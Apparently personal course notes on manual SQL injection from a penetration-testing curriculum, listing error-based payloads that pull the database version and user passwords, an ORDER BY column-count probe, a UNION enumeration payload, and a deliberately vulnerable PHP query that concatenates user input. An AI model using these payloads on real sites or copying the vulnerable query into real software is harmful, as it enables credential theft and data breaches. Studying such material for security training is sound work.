## 10.1 SQL Theory and Databases
	
###### See tool notes under [[MS SQL]] and [[MySQL]]


## 10.2 Manual SQL Exploitation

#### Identifying SQLi via Error Based Payloads
prematurely terminate sql statement:
```
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
	This will give first user in the database whether or not the user name offsec exists

![[Pasted image 20230822190838.png]]
```
SELECT plugin FROM mysql.user WHERE user='offsec';
```

Would work with MS SQL in getting the version number:
```
' or 1=1 in (select @@version) -- //
```
Dump all users in a MS SQL database injection attack:
```
' or 1=1 in (SELECT * FROM users) -- //
```
```
' or 1=1 in (SELECT password FROM users) -- //
```
```
' or 1=1 in (SELECT password FROM users where username ='admin') -- //
```

#### UNION Based Payloads
```
For UNION SQLi attacks to work, the injected UNION query has to include the same number of columns as the original query, and the data types need to match for each column. To demonstrate this concept, let’s test a web application with a preconfigured SQL query
```

query fetches all the records from the customers table. It also includes the LIKE2 keyword to search any name values containing our input that are followed by zero or any number of characters, as specified by the percentage (%) operator:
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

**Before attack, we need to know EXACT number of columns. like this:
```
' ORDER BY 1-- //
```
keep increasing column value by 1 until you get an error, like "unknown column '6'"

Attempt our first attack by enumerating the current database name, user, and MySQL version:
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

#### Blind SQL Injections

## 10.3 Manual and Automated Code Execution


![[Pasted image 20231127193718.png]]